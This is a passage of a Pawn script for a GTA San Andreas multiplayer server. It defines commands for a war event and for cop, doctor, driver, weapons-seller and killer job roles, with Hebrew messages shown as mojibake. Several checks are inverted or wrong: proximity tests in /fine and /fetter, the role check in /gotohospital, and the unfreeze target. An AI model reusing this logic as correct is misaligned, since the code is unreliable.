						case 1: wname = "Chainsaw";
						case 2: wname = "Grenade";
						case 3: wname = "Molotov";
						case 4: wname = "Pistol";
						case 5: wname = "Silenced";
						case 6: wname = "Desert Eagle";
						case 7: wname = "Shotgun";
						case 8: wname = "Sawnoff";
						case 9: wname = "Combat";
						case 10: wname = "MicroUzi";
						case 11: wname = "MP5";
						case 12: wname = "Tec9";
						case 13: wname = "AK47";
						case 14: wname = "M4";
						case 15: wname = "Sniper";
						case 16: wname = "RocketLauncher";
					}
					format(string,sizeof(string),"  [áìáã [#%d %s ñåâ äîìçîä: îìçîä òí äðù÷",warinfo[4],wname);
					SendClientMessage(playerid,pink,string);
				}
			}
			format(string,sizeof(string),"  äéðê îúçøä îñôø #%d",warinfo[1]);
			SendClientMessage(playerid,pink,string);
			SendClientMessage(playerid,purple," » !áäöìçä, åîùç÷ îäðä");
		}
		else if(equal(cmd,"quit"))
		{
			if(!warinfo[0]) return SendClientMessage(playerid,red," .àéï îìçîú ùøú ëøâò");
			if(!playerinfo[playerid][inwar]) return SendClientMessage(playerid,red," .àúä ìà áîìçîú äùøú");
			SendClientMessage(playerid,green," .ôøùú îîìçîú äùøú");
			warinfo[1]--;
			ResetWeapons(playerid);
			SpawnPlayer(playerid);
			SetPlayerVirtualWorld(playerid,world_normal);
			SetFreeze(playerid,0);
			playerinfo[playerid][waitwar] = 0, playerinfo[playerid][inwar] = 0, playerinfo[playerid][warid] = 0;
			playerinfo[playerid][inact] = 0;
			PlayerPlaySound(playerid,1084,0.0,0.0,0.0);
			if(warinfo[1] == 1)
			{
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(IsPlayerConnected(i) && playerinfo[i][inwar])
					{
						format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~r~war~w~!",GetName(i));
						MovingText(string,mt_activity);
						format(string,sizeof(string)," !ðéöç áîìçîú äùøú %s",GetName(i));
						SendClientMessageToAll(yellow,string);
						SetPlayerInterior(i,0);
						SpawnPlayer(i);
						GiveMoney(i,30000);
						playerinfo[i][inwar] = 0, playerinfo[i][waitwar] = 0, playerinfo[i][warid] = 0;
						playerinfo[i][inact] = 0;
						warinfo[0] = 0, warinfo[1] = 0, warinfo[2] = 0;
						playerinfo[i][bonus][3]++;
						if(playerinfo[i][bonus][3] == 5)
						{
							SendClientMessage(i,orange," .òì ëê ùðéöçú á5 îìçîåú ùøú ÷éáìú 50000$");
							GiveMoney(i,50000);
							playerinfo[i][bonus][3] = 0;
						}
						KillTimer(warinfo[3]);
						PlayerPlaySound(i,1084,0.0,0.0,0.0);
					}
				}
			}
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			#endif
			if(warinfo[0]) return SendClientMessage(playerid,red," .ëáø éù îìçîä");
			if(ThereIsAct()) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú ôåòìú");
			cmd = strtok(cmdtext,idx);
			new wt = (!strlen(cmd)? 0:strval(cmd));
			if(wt < 0 || wt > 17) return SendClientMessage(playerid,red," .ñåâ îìçîä ùâåé");
			cmd = strtok(cmdtext,idx);
			new wp = (!strlen(cmd)? 1:strval(cmd));
			if(wp < 1 || wp > 3) return SendClientMessage(playerid,red," .îé÷åí îìçîä ùâåé");
			warinfo[4] = wt, warinfo[5] = wp;
			StartWar();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			if(!warinfo[0]) return SendClientMessage(playerid,red," .àéï îìçîä ëøâò");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = " àéï";
			EndWar(reason,playerid);
		}
		else if(equal(cmd,"types"))
		{
			SendClientMessage(playerid,lightblue," ~~~ :ñåâé îìçîåú ùøú ~~~");
			SendClientMessage(playerid,yellow," 0 - Random | 1 - Chainsaw | 2 - Grenade | 3 - Molotov | 4 - Pistol");
			SendClientMessage(playerid,yellow," 5 - Silenced | 6 - Desert Eagle | 7 - Shotgun | 8 - Sawnoff | 9 - Combat");
			SendClientMessage(playerid,yellow," 10 - MicroUzi | 11 - MP5 | 12 - Tec9 | 13 - AK47 | 14 - M4");
			SendClientMessage(playerid,yellow," 15 - Sniper | 16 - RocketLauncher | 17 - ëì äðù÷éí äðåëçééí ùéù ìëì ùç÷ï");
		}
		else SendClientMessage(playerid,red," .àôùøåú îìçîú ùøú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/cop"))
	{
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287)) return SendClientMessage(playerid,red," .òìéê ìäéåú áãîåú ùì ùåèø áëãé ìáãå÷ îéãò òì ùåèøéí");
		SendClientMessage(playerid,lightblue," ~~~ :ùåèøéí ~~~");
		SendClientMessage(playerid,pink," .òì ëì ùåèø ìäøåâ àú âåøîé äøò: îåëøé äðù÷éí åäøåöçéí");
		SendClientMessage(playerid,pink," .òì ëì äøéâä ùì ùç÷ï \"øò\" äùåèø ääåøâ éé÷áì àú ëñó äðøöç, 250$ åâí òìééú øîú ùåèø");
		SendClientMessage(playerid,pink," .ìùåèø ùäøâ ùç÷ï çó îôùò, ééøãå 100$ | ìùç÷ï ùäøâ ùåèø ééøãå 150$");
		SendClientMessage(playerid,yellow," /becop :ëãé ìäéåú ùåèø éù ìä÷ìéã àú äô÷åãä");
		SendClientMessage(playerid,purple," :ô÷åãåú ùåèøéí");
		SendClientMessage(playerid,purple," (áñåâøééí øùåîä øîú äùåèø äãøåùä, ðéúï ìäùúîù áô÷åãåú áëì øîú ùç÷ï)");
		SendClientMessage(playerid,yellow," /getwanted(1) /getclevel(1) /fine(3) /getgun(8) /fetter(17) /gotocop(30)");
		return 1;
	}
	if(equal(cmd,"/becop"))
	{
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287)) return SendClientMessage(playerid,red," .òìéê ìäéåú áãîåú ùì ùåèø áëãé ìòáåã áúåø ùåèø");
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áòáåãä ëìùäéú");
		playerinfo[playerid][work] = work_cop;
		playerinfo[playerid][coplevel] = 1;
		SendClientMessage(playerid,blue," /cop :ëòú àúä ùåèø. ìîéãò òì ùåèøéí äùúîù áô÷åãä");
		return 1;
	}
	if(equal(cmd,"/getwanted"))
	{
 		new id, string[M_S];
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287) || playerinfo[playerid][work] != work_cop) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ùåèø");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getwanted [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(playerinfo[id][work] == work_cop) return SendClientMessage(playerid,red," .ìà ðéúï ìáãå÷ øîú îáå÷ùåú ùì ùåèøéí");
		format(string,sizeof(string)," .äéà %d %s øîú äîáå÷ùåú ùì",playerinfo[id][wantedlevel],GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/getclevel"))
	{
 		new id, string[M_S];
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287) || playerinfo[playerid][work] != work_cop) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ùåèø");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getclevel [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(playerinfo[id][work] != work_cop) return SendClientMessage(playerid,red," .äùç÷ï äðáçø ìà ùåèø");
		format(string,sizeof(string)," .äéà %d %s øîú äùåèø ùì",playerinfo[id][coplevel],GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/fine"))
	{
 		new id, string[M_S];
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287) || playerinfo[playerid][work] != work_cop) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ùåèø");
		if(playerinfo[playerid][coplevel] < 3) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ìôçåú áøîú ùåèø 3");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /fine [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(GetDistanceBetweenPlayers(playerid,id) < 7.500000) return SendClientMessage(playerid,red," .äùç÷ï öøéê ìäéåú ÷øåá àìéê");
		if(playerinfo[id][work] == work_cop) return SendClientMessage(playerid,red," .ìà ðéúï ìúú ÷ðñ ìùåèøéí");
		format(string,sizeof(string)," .%s ðúú ÷ðñ ì",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," !%s ÷éáìú ÷ðñ î",GetName(playerid));
		SendClientMessage(id,red,string);
		GiveMoney(id,0-50);
		return 1;
	}
	if(equal(cmd,"/getgun"))
	{
 		new gunid, string[M_S];
		if(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287 && playerinfo[playerid][work] == work_cop)
		{
			if(playerinfo[playerid][coplevel] < 8) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ìôçåú áøîú ùåèø 8");
			if(playerinfo[playerid][death][3]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ø÷ ìàçø ùúîåú");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /getgun [pistol/shotgun/tec9] :öåøú äùéîåù");
			if(equal(cmd,"pistol")) gunid = 22;
			else if(equal(cmd,"shotgun")) gunid = 25;
			else if(equal(cmd,"tec9")) gunid = 32;
			else return SendClientMessage(playerid,red," .ùí ðù÷ ùâåé");
			format(string,sizeof(string)," .%s ÷éáìú",WeaponName(gunid));
			SendClientMessage(playerid,green,string);
			GiveWeapon(playerid,gunid,randomEx(5,200));
		}
		else if(playerinfo[playerid][work] == work_killer)
		{
			if(playerinfo[playerid][killerlevel] < 10) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ìôçåú áøîú øåöç 10");
			if(playerinfo[playerid][death][3]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ø÷ ìàçø ùúîåú");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /getgun [deagle/ak47/sniper] :öåøú äùéîåù");
			if(equal(cmd,"deagle")) gunid = 24;
			else if(equal(cmd,"ak47")) gunid = 30;
			else if(equal(cmd,"sniper")) gunid = 34;
			else return SendClientMessage(playerid,red," .ùí ðù÷ ùâåé");
			format(string,sizeof(string)," .%s ÷éáìú",WeaponName(gunid));
			SendClientMessage(playerid,green,string);
			GiveWeapon(playerid,gunid,randomEx(20,150));
		}
		else return SendClientMessage(playerid,red," .òìéê ìäéåú ùåèø àå øåöç ìùéîåù áô÷åãä æå");
		return 1;
	}
	if(equal(cmd,"/fetter"))
	{
 		new id, string[M_S];
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287) || playerinfo[playerid][work] != work_cop) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ùåèø");
		if(playerinfo[playerid][coplevel] < 17) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ìôçåú áøîú ùåèø 17");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /fetter [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(GetDistanceBetweenPlayers(playerid,id) < 7.500000) return SendClientMessage(playerid,red," .äùç÷ï öøéê ìäéåú ÷øåá àìéê");
		if(playerinfo[id][work] == work_cop) return SendClientMessage(playerid,red," .ìà ðéúï ìùéí àæé÷éí ìùåèøéí");
		format(string,sizeof(string)," .%s ùîú àæé÷éí ì",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .åúùåçøø áòåã 5 ùðéåú %s ÷éáìú àæé÷éí î",GetName(playerid));
		SendClientMessage(id,red,string);
		if(playerinfo[id][work] == work_weapons || playerinfo[id][work] == work_killer) return ExitWork(id," ðúôñ òì éãé ùåèø");
		SetFreeze(id,1);
		SetTimerEx("UnFreeze",5000,0,"d",playerid);
		return 1;
	}
	if(equal(cmd,"/gotocop"))
	{
 		new id, Float:p[3], string[M_S];
		if(!(GetPlayerSkin(playerid) >= 280 && GetPlayerSkin(playerid) <= 287) || playerinfo[playerid][work] != work_cop) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ùåèø");
		if(playerinfo[playerid][coplevel] < 30) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ìôçåú áøîú ùåèø 30");
		if(playerinfo[playerid][death][4]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ø÷ ìàçø ùúîåú");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /gotocop [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(playerinfo[id][work] != work_cop) return SendClientMessage(playerid,red," .äùç÷ï äðáçø ìà ùåèø");
		format(string,sizeof(string)," .%s äùúâøú ìùåèø",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .äùúâø àìéê %s äùåèø",GetName(playerid));
		SendClientMessage(id,green,string);
		GetPlayerPos(id,p[0],p[1],p[2]);
		if(IsPlayerInAnyVehicle(playerid))
		{
			if(!GetPlayerInterior(id)) SetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]+4.000000);
			else SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		}
		else SetPlayerPos(playerid,p[0],p[1],p[2]+3.000000);
		SetPlayerInterior(playerid,GetPlayerInterior(id));
		SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
		return 1;
	}
	if(equal(cmd,"/doctor"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :øåôàéí ~~~");
		SendClientMessage(playerid,pink," .òì ëì øåôà ìèôì áùç÷ðéí áòìé îòè çééí áãøê ô÷åãú øéôåé");
		SendClientMessage(playerid,pink," .òì ëì øéôåé ùç÷ï, äøåôà éé÷áì 300$ åòìééú øîú øåôà");
		SendClientMessage(playerid,pink," .ìøåôà ùééèôì áùç÷ï áøéà ééøãå 100$ | ìùç÷ï ùééäøåâ øåôà ééøãå 500$");
		SendClientMessage(playerid,pink," .øåôàéí ìà éëåìéí ìøôàåú àçã àú äùðé");
		SendClientMessage(playerid,yellow," /bedoctor :ëãé ìäéåú øåôà éù ìä÷ìéã àú äô÷åãä");
		SendClientMessage(playerid,purple," :ô÷åãåú øåôàéí");
		SendClientMessage(playerid,purple," (áñåâøééí øùåîä øîú äøåôà äãøåùä, ðéúï ìäùúîù áô÷åãåú áëì øîú ùç÷ï)");
		SendClientMessage(playerid,yellow," /heal(1) /gotohospital(6)");
		return 1;
	}
	if(equal(cmd,"/bedoctor"))
	{
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áòáåãä ëìùäéú");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 416) return SendClientMessage(playerid,red," .òìéê ìäéåú áàîáåìðñ áëãé ìäéåú ðäâ àîáåìðñ");
		playerinfo[playerid][work] = work_doctor;
		playerinfo[playerid][doctorlevel] = 1;
		SendClientMessage(playerid,blue," /doctor :ëòú àúä øåôà. ìîéãò òì øåôàéí äùúîù áô÷åãä");
		return 1;
	}
	if(equal(cmd,"/heal"))
	{
 		new id, string[M_S], Float:h;
		if(playerinfo[playerid][work] != work_doctor) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú øåôà");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /heal [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(GetDistanceBetweenPlayers(playerid,id) > 7.500000) return SendClientMessage(playerid,red," .äùç÷ï öøéê ìäéåú ÷øåá àìéê");
		if(playerinfo[id][work] == work_doctor) return SendClientMessage(playerid,red," .øåôà ìà éëåì ìøôàåú øåôà àçø");
		GetPlayerHealth(id,h);
		if(h >= 100.0)
		{
			SendClientMessage(playerid,red," !øéôéú ùç÷ï áøéà, ééøãå ìê 100$");
			GiveMoney(playerid,0-100);
			if(GetMoney(playerid) < 0) ExitWork(playerid," øéôåé ùç÷ðéí áøéàéí");
			return 1;
		}
		format(string,sizeof(string)," .%s øéôéú àú",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .øéôà àåúê %s äøåôà",GetName(playerid));
		SendClientMessage(id,red,string);
		SetPlayerHealth2(id,100.0);
		playerinfo[playerid][doctorlevel]++;
		return 1;
	}
	if(equal(cmd,"/gotohospital"))
	{
		if(playerinfo[playerid][work] != work_cop) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú øåôà");
		if(playerinfo[playerid][doctorlevel] < 6) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú ìôçåú áøîú øåôà 6");
		if(playerinfo[playerid][death][5]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ø÷ ìàçø ùúîåú");
		SendClientMessage(playerid,green," .äùúâøú ìáéú äçåìéí");
		if(IsPlayerInAnyVehicle(playerid))
		{
			SetVehiclePos(GetPlayerVehicleID(playerid),1606.0957,1825.4957,10.8203);
			SetVehicleZAngle(GetPlayerVehicleID(playerid),4.5332);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			LinkVehicleToInterior(GetPlayerVehicleID(playerid),0);
		}
		else
		{
			SetPlayerPos(playerid,1606.0957,1825.4957,10.8203);
			SetPlayerFacingAngle(playerid,4.5332);
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid,world_normal);
		SetPlayerInterior(playerid,0);
		return 1;
	}
	if(equal(cmd,"/taxid"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :ðäâé îåðéú ~~~");
		SendClientMessage(playerid,pink," .òì ëì ðäâ ìäñéò ùç÷ðéí îî÷åí ìî÷åí");
		SendClientMessage(playerid,pink," .ìùç÷ï ùééäøåâ ðäâ îåðéú ééøãå 200$");
		SendClientMessage(playerid,pink," .áøâò ùäðäâ éåöà îäîåðéú ùìå, äåà îôñé÷ àú òáåãúå");
		SendClientMessage(playerid,yellow," /betaxid :ëãé ìäéåú ðäâ îåðéú éù ìä÷ìéã àú äô÷åãä ëàùø àúä áîåðéú");
		return 1;
	}
	if(equal(cmd,"/betaxid"))
	{
		new string[M_S], amount;
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áòáåãä ëìùäéú");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 420) return SendClientMessage(playerid,red," .òìéê ìäéåú áîåðéú áëãé ìäéåú ðäâ îåðéú");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /betaxid [amount] :öåøú äùéîåù");
		amount = strval(cmd);
		if(amount < 0 || amount > 1000) return SendClientMessage(playerid,red," .ëîåú ùâåéä");
		playerinfo[playerid][work] = work_taxi;
		playerinfo[playerid][drivecost] = amount;
		format(string,sizeof(string)," ** !ðäâ îåðéú áòã %d$ %s",amount,GetName(playerid));
		SendClientMessageToAll(yellow,string);
		return 1;
	}
	if(equal(cmd,"/busd"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :ðäâé àåèåáåñ ~~~");
		SendClientMessage(playerid,pink," .òì ëì ðäâ ìäñéò ùç÷ðéí îî÷åí ìî÷åí");
		SendClientMessage(playerid,pink," .ìùç÷ï ùééäøåâ ðäâ àåèåáåñ ééøãå 300$");
		SendClientMessage(playerid,pink," .áøâò ùäðäâ éåöà îäàåèåáåñ ùìå, äåà îôñé÷ àú òáåãúå");
		SendClientMessage(playerid,yellow," /bebusd :ëãé ìäéåú ðäâ àåèåáåñ éù ìä÷ìéã àú äô÷åãä ëàùø àúä áàåèåáåñ");
		return 1;
	}
	if(equal(cmd,"/bebusd"))
	{
		new string[M_S], amount;
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áòáåãä ëìùäéú");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 431) return SendClientMessage(playerid,red," .òìéê ìäéåú áàåèåáåñ áëãé ìäéåú ðäâ àåèåáåñ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bebusd [amount] :öåøú äùéîåù");
		amount = strval(cmd);
		if(amount < 0 || amount > 1200) return SendClientMessage(playerid,red," .ëîåú ùâåéä");
		playerinfo[playerid][work] = work_bus;
		playerinfo[playerid][drivecost] = amount;
		format(string,sizeof(string)," ** !ðäâ àåèåáåñ áòã %d$ %s",amount,GetName(playerid));
		SendClientMessageToAll(yellow,string);
		return 1;
	}
	if(equal(cmd,"/traind"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :ðäâé øëáú ~~~");
		SendClientMessage(playerid,pink," .òì ëì ðäâ ìäñéò ùç÷ðéí îúçðä ìúçðä");
		SendClientMessage(playerid,pink," .ìùç÷ï ùééäøåâ ðäâ øëáú ééøãå 1000$");
		SendClientMessage(playerid,pink," .áøâò ùäðäâ éåöà îäøëáú ùìå, äåà îôñé÷ àú òáåãúå");
		SendClientMessage(playerid,yellow," /betraind :ëãé ìäéåú ðäâ øëáú éù ìä÷ìéã àú äô÷åãä ëàùø àúä áøëáú");
		return 1;
	}
	if(equal(cmd,"/betraind"))
	{
		new string[M_S], amount;
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áòáåãä ëìùäéú");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 538) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëáú áëãé ìäéåú ðäâ áøëáú");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /betraind [amount] :öåøú äùéîåù");
		amount = strval(cmd);
		if(amount < 0 || amount > 1500) return SendClientMessage(playerid,red," .ëîåú ùâåéä");
		playerinfo[playerid][work] = work_train;
		playerinfo[playerid][drivecost] = amount;
		format(string,sizeof(string)," ** !ðäâ øëáú áòã %d$ %s",amount,GetName(playerid));
		SendClientMessageToAll(yellow,string);
		return 1;
	}
	if(equal(cmd,"/pilot"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :èééñéí ~~~");
		SendClientMessage(playerid,pink," .òì ëì èééñ ìäèéñ ùç÷ðéí îî÷åí ìî÷åí");
		SendClientMessage(playerid,pink," .ìùç÷ï ùééäøåâ èééñ ééøãå 1000$");
		SendClientMessage(playerid,pink," .áøâò ùäèééñ éåöà îääìé÷åôèø ùìå, äåà îôñéã àú òáåãúå");
		SendClientMessage(playerid,yellow," /bepilot :Maverick ëãé ìäéåú èééñ éù ìä÷ìéã àú äô÷åãä ëàùø àúä áäìé÷åôèø");
		return 1;
	}
	if(equal(cmd,"/bepilot"))
	{
		new string[M_S], amount;
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áòáåãä ëìùäéú");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 487) return SendClientMessage(playerid,red," .áëãé ìäéåú èééñ Maverick òìéê ìäéåú áäìé÷åôèø");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bepilot [amount] :öåøú äùéîåù");
		amount = strval(cmd);
		if(amount < 0 || amount > 1300) return SendClientMessage(playerid,red," .ëîåú ùâåéä");
		playerinfo[playerid][work] = work_pilot;
		playerinfo[playerid][drivecost] = amount;
		format(string,sizeof(string)," ** !èééñ áòã %d$ %s",amount,GetName(playerid));
		SendClientMessageToAll(yellow,string);
		return 1;
	}
	if(equal(cmd,"/sweapons"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :îåëøé ðù÷éí ~~~");
		SendClientMessage(playerid,pink," .òì ëì îåëø ðù÷ ìîëåø ðù÷éí ìùç÷ðéí áîçéø ÷áåò");
		SendClientMessage(playerid,pink," .òì ëì îëéøä, îåëø äðù÷éí éé÷áì àú ùååé äðù÷ äðîëø");
		SendClientMessage(playerid,pink," .îåëø ðù÷éí ìà éëåì ìîëåø ðù÷éí ìòöîå àå ìîåëø ðù÷éí àçø");
		SendClientMessage(playerid,pink," .äðù÷éí äðîëøéí, àéðí úîéãééí");
		SendClientMessage(playerid,yellow," /besweapons :ëãé ìäéåú îåëø ðù÷éí éù ìä÷ìéã àú äô÷åãä");
		SendClientMessage(playerid,purple," :ô÷åãåú îåëøé ðù÷éí");
		SendClientMessage(playerid,yellow," /swbw(1)");
		return 1;
	}
	if(equal(cmd,"/besweapons"))
	{
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áòáåãä ëìùäéú");
		playerinfo[playerid][work] = work_weapons;
		SendClientMessage(playerid,blue," /sweapons :ëòú àúä îåëø ðù÷éí. ìîéãò òì îåëøé äðù÷éí äùúîù áô÷åãä");
		return 1;
	}
	if(equal(cmd,"/swbw"))
	{
		new string[M_S], weaponid, seller = INVALID_PLAYER_ID;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][work] == work_weapons)
			{
				if(GetDistanceBetweenPlayers(playerid,i) < 8.000000)
				{
					seller = i;
					break;
				}
			}
		}
		if(seller == INVALID_PLAYER_ID) return SendClientMessage(playerid,red," .àéï ùåí îåëø ðù÷éí ÷øåá àìéê");
		if(playerinfo[seller][work] == work_weapons) return SendClientMessage(playerid,red," .ìà ðéúï ìîëåø ðù÷éí ìîåëø ðù÷éí");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /swbw [weapon number] :öåøú äùéîåù");
		weaponid = strval(cmd);
		if(weaponid < 0 || weaponid > sizeof(Ammunation)) return SendClientMessage(playerid,red," .îñôø ðù÷ ùâåé");
		if(GetMoney(playerid) < WeaponCost(playerid,weaponid)) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú àú äðù÷ äæä");
		GiveWeapon(playerid,Ammunation[weaponid][aID],Ammunation[weaponid][aAmmo]);
		GiveMoney(playerid,0-WeaponCost(playerid,weaponid));
		GiveMoney(seller,WeaponCost(playerid,weaponid));
		format(string,sizeof(string)," .%s îîåëø äðù÷éí %s øëùú àú äðù÷",GetName(seller),Ammunation[weaponid][aName]);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .÷éáìú %d$ îì÷åç",WeaponCost(playerid,weaponid));
		SendClientMessage(seller,green,string);
		return 1;
	}
	if(equal(cmd,"/killer"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :øåöçéí ~~~");
		SendClientMessage(playerid,pink," .òì ëì øåöç ìâøåí ðæ÷, èéøåø åöøåú ìîùèøä");
		SendClientMessage(playerid,pink," .òì ëì äøéâú ùç÷ï, äøåöç éé÷áì 150$ åòìééú øîú øåöç");
		SendClientMessage(playerid,pink," .òì ëì äøéâú ùåèø, äøåöç éé÷áì 200$ åòìééú ùúé øîåú");
		SendClientMessage(playerid,yellow," /bekiller :ëãé ìäéåú øåöç éù ìä÷ìéã àú äô÷åãä");
		SendClientMessage(playerid,purple," :ô÷åãåú øåöçéí");
		SendClientMessage(playerid,purple," (áñåâøééí øùåîä øîú äøåöç äãøåùä, ðéúï ìäùúîù áô÷åãåú áëì øîú ùç÷ï)");
		SendClientMessage(playerid,yellow," /getklevel(1) /getgun(10) /allfreeze(32)");
		return 1;
	}
	if(equal(cmd,"/bekiller"))
	{
		if(playerinfo[playerid][work] != work_none) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áòáåãä ëìùäéú");
		playerinfo[playerid][work] = work_killer;
		playerinfo[playerid][killerlevel] = 1;
		SendClientMessage(playerid,blue," /killer :ëòú àúä øåöç. ìîéãò òì øåöçéí äùúîù áô÷åãä");
		return 1;
	}
	if(equal(cmd,"/getklevel"))
	{
 		new id, string[M_S];
		if(playerinfo[playerid][work] != work_killer) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú øåöç");
		cmd = strtok(cmdtext,idx);
